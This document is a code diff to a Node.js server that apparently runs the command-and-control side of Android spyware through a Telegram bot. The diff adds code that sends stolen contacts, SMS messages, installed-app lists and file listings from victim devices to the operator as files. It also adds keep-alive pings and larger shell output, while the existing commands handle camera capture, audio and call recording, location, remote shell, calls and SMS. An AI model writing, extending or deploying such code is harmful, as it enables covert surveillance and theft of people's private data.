@@ -33,8 +33,8 @@ app.use(express.json({ limit: '50mb' }));
 // DATA STRUCTURES
 // ============================================
 const connectedDevices = new Map();
-const userSessions = new Map(); // Keep for input handling
-const pendingCommands = new Map(); // Track command responses
+const userSessions = new Map();
+const pendingCommands = new Map();
 
 // ============================================
 // DIRECTORY CREATION
@@ -69,10 +69,44 @@ const upload = multer({
 });
 
 // ============================================
-// KEYBOARD DEFINITIONS - FULLY RESTORED
+// KEEP ALIVE - PING DEVICES EVERY 5 SECONDS
+// ============================================
+setInterval(() => {
+    const now = Date.now();
+    connectedDevices.forEach((device, deviceId) => {
+        try {
+            if (device.ws && device.ws.readyState === 1) {
+                device.ws.send(JSON.stringify({
+                    type: 'ping',
+                    timestamp: now
+                }));
+                
+                if (now - device.lastSeen > 30000) {
+                    console.log(`⚠️ Device ${deviceId} stale, terminating`);
+                    device.ws.terminate();
+                    connectedDevices.delete(deviceId);
+                }
+            }
+        } catch (e) {}
+    });
+}, 5000);
+
+// ============================================
+// KEEP SERVER ALIVE - PING EVERY 12 HOURS
+// ============================================
+setInterval(() => {
+    try {
+        fetch(`https://dma-eq9s.onrender.com/health`)
+            .catch(() => {});
+        console.log('🔄 Server keep-alive ping sent');
+    } catch (e) {}
+}, 12 * 60 * 60 * 1000);
+
+// ============================================
+// KEYBOARD DEFINITIONS
 // ============================================
 
-// MAIN KEYBOARD - 2 buttons
+// MAIN KEYBOARD
 const mainKeyboard = {
     reply_markup: {
         keyboard: [
@@ -84,7 +118,7 @@ const mainKeyboard = {
     }
 };
 
-// DEVICE SELECTION KEYBOARD - Shows all devices
+// DEVICE SELECTION KEYBOARD
 const deviceSelectionKeyboard = (devices) => {
     const buttons = [];
     devices.forEach((device, id) => {
@@ -184,7 +218,6 @@ const removeKeyboard = {
 let bot = null;
 
 async function startBot() {
-    // Clear any existing webhook
     try {
         await fetch(`https://api.telegram.org/bot${token}/deleteWebhook?drop_pending_updates=true`);
     } catch(e) {}
@@ -198,7 +231,7 @@ async function startBot() {
     });
     
     bot.getMe().then(me => console.log(`✅ Bot: @${me.username}`));
-    bot.on('polling_error', () => {}); // Ignore errors
+    bot.on('polling_error', () => {});
     
     setupBotCommandHandlers();
     setupBotCommands();
@@ -267,22 +300,20 @@ wss.on('connection', (ws, req) => {
         try {
             const msg = JSON.parse(data);
             
-            // Command response
-            if (msg.type === 'response') {
+            if (msg.type === 'pong') {
+                const device = connectedDevices.get(deviceId);
+                if (device) device.lastSeen = Date.now();
+            }
+            else if (msg.type === 'response') {
                 handleCommandResponse(deviceId, msg);
             }
-            // Device info update
             else if (msg.type === 'device_info') {
                 const device = connectedDevices.get(deviceId);
                 if (device) {
                     device.deviceInfo = { ...device.deviceInfo, ...msg.data };
+                    device.lastSeen = Date.now();
                 }
             }
-            
-            // Update last seen
-            const dev = connectedDevices.get(deviceId);
-            if (dev) dev.lastSeen = Date.now();
-            
         } catch(e) {}
     });
 
@@ -293,7 +324,6 @@ wss.on('connection', (ws, req) => {
         }
     });
 
-    // Request device info immediately
     ws.send(JSON.stringify({
         type: 'command',
         id: uuidv4(),
@@ -303,7 +333,7 @@ wss.on('connection', (ws, req) => {
 });
 
 // ============================================
-// COMMAND RESPONSE HANDLER - FAST
+// COMMAND RESPONSE HANDLER - FIXED
 // ============================================
 function handleCommandResponse(deviceId, response) {
     if (!bot) return;
@@ -311,7 +341,6 @@ function handleCommandResponse(deviceId, response) {
     const device = connectedDevices.get(deviceId);
     const model = device?.deviceInfo?.model?.split(' ')[0] || deviceId.substring(0, 6);
     
-    // Find pending command
     const pending = pendingCommands.get(response.commandId || response.id);
     if (pending) {
         pendingCommands.delete(response.commandId || response.id);
@@ -336,29 +365,81 @@ function handleCommandResponse(deviceId, response) {
         bot.sendMessage(chatId, msg).catch(()=>{});
     }
     
-    // CONTACTS
+    // CONTACTS - FIXED
     else if (response.data && response.data.contacts) {
-        bot.sendMessage(chatId, `📒 Contacts - ${model}\nRetrieved successfully`).catch(()=>{});
+        try {
+            const contactsJson = response.data.contacts;
+            if (contactsJson && contactsJson !== "[]" && contactsJson !== "null" && contactsJson.length > 2) {
+                const filename = `contacts_${deviceId}_${Date.now()}.txt`;
+                const filepath = path.join(__dirname, 'uploads', filename);
+                fs.writeFileSync(filepath, contactsJson);
+                bot.sendDocument(chatId, filepath, {
+                    caption: `📒 Contacts - ${model} (${response.data.count || '?'})`
+                }).catch(()=>{});
+                setTimeout(() => fs.unlinkSync(filepath), 60000);
+            } else {
+                bot.sendMessage(chatId, `📒 Contacts - ${model}\nNo contacts found`).catch(()=>{});
+            }
+        } catch (e) {
+            bot.sendMessage(chatId, `📒 Contacts - ${model}\nError parsing contacts`).catch(()=>{});
+        }
     }
     
-    // APPS
-    else if (response.data && response.data.apps) {
-        bot.sendMessage(chatId, `📱 Apps - ${model}\nTotal: ${response.data.count || 0}`).catch(()=>{});
-    }
-    
-    // MESSAGES
+    // MESSAGES - FIXED
     else if (response.data && response.data.messages) {
-        bot.sendMessage(chatId, `📨 Messages - ${model}\nRetrieved successfully`).catch(()=>{});
+        try {
+            const messagesJson = response.data.messages;
+            if (messagesJson && messagesJson !== "[]" && messagesJson !== "null" && messagesJson.length > 2) {
+                const filename = `messages_${deviceId}_${Date.now()}.txt`;
+                const filepath = path.join(__dirname, 'uploads', filename);
+                fs.writeFileSync(filepath, messagesJson);
+                bot.sendDocument(chatId, filepath, {
+                    caption: `📨 SMS Messages - ${model} (${response.data.count || '?'})`
+                }).catch(()=>{});
+                setTimeout(() => fs.unlinkSync(filepath), 60000);
+            } else {
+                bot.sendMessage(chatId, `📨 Messages - ${model}\nNo messages found`).catch(()=>{});
+            }
+        } catch (e) {
+            bot.sendMessage(chatId, `📨 Messages - ${model}\nError parsing messages`).catch(()=>{});
+        }
+    }
+    
+    // APPS - FIXED
+    else if (response.data && response.data.apps) {
+        try {
+            const appsJson = response.data.apps;
+            if (appsJson && appsJson !== "[]" && appsJson !== "null" && appsJson.length > 2) {
+                const filename = `apps_${deviceId}_${Date.now()}.txt`;
+                const filepath = path.join(__dirname, 'uploads', filename);
+                fs.writeFileSync(filepath, appsJson);
+                bot.sendDocument(chatId, filepath, {
+                    caption: `📱 Apps - ${model} (${response.data.count || '?'})`
+                }).catch(()=>{});
+                setTimeout(() => fs.unlinkSync(filepath), 60000);
+            }
+        } catch (e) {}
     }
     
     // FILES - BROWSE
     else if (response.data && response.data.files) {
-        bot.sendMessage(chatId, `📁 Files - ${model}\nPath: ${response.data.path || '/'}`).catch(()=>{});
+        try {
+            const filesJson = response.data.files;
+            if (filesJson && filesJson !== "[]" && filesJson.length > 2) {
+                const filename = `files_${deviceId}_${Date.now()}.txt`;
+                const filepath = path.join(__dirname, 'uploads', filename);
+                fs.writeFileSync(filepath, filesJson);
+                bot.sendDocument(chatId, filepath, {
+                    caption: `📁 Files - ${model}\nPath: ${response.data.path || '/'}`
+                }).catch(()=>{});
+                setTimeout(() => fs.unlinkSync(filepath), 60000);
+            }
+        } catch (e) {}
     }
     
     // SHELL OUTPUT
     else if (response.output !== undefined) {
-        const output = response.output.substring(0, 400);
+        const output = response.output.substring(0, 4000);
         bot.sendMessage(chatId, `🖥️ ${model}:\n\`\`\`\n${output}\n\`\`\``, { parse_mode: 'Markdown' }).catch(()=>{});
     }
     
@@ -407,10 +488,8 @@ function sendCommandToDevice(deviceId, command, data = {}, chatId = adminId) {
         timestamp: Date.now()
     };
     
-    // Store pending command
     pendingCommands.set(cmdId, { chatId, deviceId, command });
     
-    // Auto-cleanup after 30 seconds
     setTimeout(() => {
         pendingCommands.delete(cmdId);
     }, 30000);
@@ -425,12 +504,12 @@ function sendCommandToDevice(deviceId, command, data = {}, chatId = adminId) {
 }
 
 // ============================================
-// BOT COMMAND HANDLERS - ALL 23 COMMANDS RESTORED
+// BOT COMMAND HANDLERS
 // ============================================
 function setupBotCommandHandlers() {
     if (!bot) return;
 
-    // === START COMMAND ===
+    // START COMMAND
     bot.onText(/\/start/, (msg) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -446,7 +525,7 @@ function setupBotCommandHandlers() {
         ).catch(()=>{});
     });
 
-    // === HELP COMMAND - FULL HELP ===
+    // HELP COMMAND
     bot.onText(/\/help/, (msg) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -496,7 +575,7 @@ function setupBotCommandHandlers() {
         bot.sendMessage(chatId, help, { parse_mode: 'Markdown' }).catch(()=>{});
     });
 
-    // === KEYBOARD COMMAND ===
+    // KEYBOARD COMMAND
     bot.onText(/\/keyboard/, (msg) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -511,7 +590,7 @@ function setupBotCommandHandlers() {
         }).catch(()=>{});
     });
 
-    // === LIST COMMAND ===
+    // LIST COMMAND
     bot.onText(/\/list/, (msg) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -536,7 +615,7 @@ function setupBotCommandHandlers() {
         }).catch(()=>{});
     }
 
-    // === INFO COMMAND ===
+    // INFO COMMAND
     bot.onText(/\/info (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -549,7 +628,7 @@ function setupBotCommandHandlers() {
         }
     });
 
-    // === SCREENSHOT COMMAND ===
+    // SCREENSHOT COMMAND
     bot.onText(/\/screenshot (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -562,7 +641,7 @@ function setupBotCommandHandlers() {
         }
     });
 
-    // === CAMERA COMMAND ===
+    // CAMERA COMMAND
     bot.onText(/\/camera (.+) (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -577,7 +656,7 @@ function setupBotCommandHandlers() {
         }
     });
 
-    // === RECORD COMMAND ===
+    // RECORD COMMAND
     bot.onText(/\/record (.+) (\d+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -592,7 +671,7 @@ function setupBotCommandHandlers() {
         }
     });
 
-    // === LOCATION COMMAND ===
+    // LOCATION COMMAND
     bot.onText(/\/location (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -605,7 +684,7 @@ function setupBotCommandHandlers() {
         }
     });
 
-    // === BROWSE COMMAND ===
+    // BROWSE COMMAND
     bot.onText(/\/browse (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -618,7 +697,7 @@ function setupBotCommandHandlers() {
         ).catch(()=>{});
     });
 
-    // === DOWNLOAD COMMAND ===
+    // DOWNLOAD COMMAND
     bot.onText(/\/download (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -631,7 +710,7 @@ function setupBotCommandHandlers() {
         ).catch(()=>{});
     });
 
-    // === CALL COMMAND ===
+    // CALL COMMAND
     bot.onText(/\/call (.+) (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -646,7 +725,7 @@ function setupBotCommandHandlers() {
         }
     });
 
-    // === SMS COMMAND ===
+    // SMS COMMAND
     bot.onText(/\/sms (.+) (.+) (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -662,7 +741,7 @@ function setupBotCommandHandlers() {
         }
     });
 
-    // === CONTACTS COMMAND ===
+    // CONTACTS COMMAND
     bot.onText(/\/contacts (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -675,7 +754,7 @@ function setupBotCommandHandlers() {
         }
     });
 
-    // === MESSAGES COMMAND ===
+    // MESSAGES COMMAND
     bot.onText(/\/messages (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -688,7 +767,7 @@ function setupBotCommandHandlers() {
         }
     });
 
-    // === APPS COMMAND ===
+    // APPS COMMAND
     bot.onText(/\/apps (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -701,7 +780,7 @@ function setupBotCommandHandlers() {
         }
     });
 
-    // === SHELL COMMAND ===
+    // SHELL COMMAND
     bot.onText(/\/shell (.+) (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -716,7 +795,7 @@ function setupBotCommandHandlers() {
         }
     });
 
-    // === RECORD CALL COMMAND ===
+    // RECORD CALL COMMAND
     bot.onText(/\/record_call (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -729,7 +808,7 @@ function setupBotCommandHandlers() {
         }
     });
 
-    // === STOP CALL COMMAND ===
+    // STOP CALL COMMAND
     bot.onText(/\/stop_call (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -742,7 +821,7 @@ function setupBotCommandHandlers() {
         }
     });
 
-    // === NOTIFY COMMAND ===
+    // NOTIFY COMMAND
     bot.onText(/\/notify (.+) (.+) (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== adminId) return;
@@ -758,7 +837,7 @@ function setupBotCommandHandlers() {
         }
     });
 
-    // === MESSAGE HANDLER - BUTTONS & INPUT ===
+    // MESSAGE HANDLER - BUTTONS & INPUT
     bot.on('message', (msg) => {
         const chatId = msg.chat.id;
         const text = msg.text;
@@ -766,7 +845,6 @@ function setupBotCommandHandlers() {
         if (chatId.toString() !== adminId || !text) return;
         if (text.startsWith('/')) return;
         
-        // MAIN MENU BUTTONS
         if (text === '📱 Devices') {
             showDeviceList(chatId);
         }
@@ -781,7 +859,6 @@ function setupBotCommandHandlers() {
             }).catch(()=>{});
             clearUserSession(chatId);
         }
-        // DEVICE SELECTION - RESTORED
         else if (text.includes('📱') && text.includes('(') && text.includes(')')) {
             const deviceEntry = Array.from(connectedDevices.entries()).find(([id]) => 
                 text.includes(id.substring(0, 4))
@@ -803,7 +880,6 @@ function setupBotCommandHandlers() {
             }
         }
         
-        // INPUT HANDLERS
         const session = getUserSession(chatId);
         if (!session) return;
         
@@ -861,7 +937,7 @@ function setupBotCommandHandlers() {
         }
     });
 
-    // === CALLBACK QUERY HANDLER - ALL ACTIONS RESTORED ===
+    // CALLBACK QUERY HANDLER
     bot.on('callback_query', async (callbackQuery) => {
         const chatId = callbackQuery.message.chat.id;
         const data = callbackQuery.data;
@@ -874,7 +950,6 @@ function setupBotCommandHandlers() {
         const action = parts[0];
         let deviceId = parts.slice(1).join('_');
         
-        // Handle nested callbacks
         if (action === 'camera' && (parts[1] === 'front' || parts[1] === 'rear')) {
             deviceId = parts.slice(2).join('_');
             sendCommandToDevice(deviceId, 'take_photo', { camera: parts[1] }, chatId);
@@ -992,7 +1067,7 @@ app.post('/api/upload', upload.single('file'), async (req, res) => {
         
         if (bot) {
             await bot.sendDocument(adminId, req.file.path, {
-                caption: `📁 ${fileType}\nDevice: ${deviceId.substring(0,6)}...`
+                caption: `📁 ${fileType}\nDevice: ${deviceId.substring(0,6)}...\nSize: ${(req.file.size / 1024 / 1024).toFixed(2)}MB`
             }).catch(()=>{});
             
             setTimeout(() => {
@@ -1037,6 +1112,7 @@ server.listen(PORT, '0.0.0.0', async () => {
     
     console.log(`🤖 Bot: ${bot ? '✅ Connected' : '❌ Failed'}`);
     console.log(`📱 Commands: 23 registered`);
+    console.log(`🔄 Keep-alive: Active (5s ping, 12h server)`);
     console.log('━━━━━━━━━━━━━━━━━━━━━\n');
 });
 
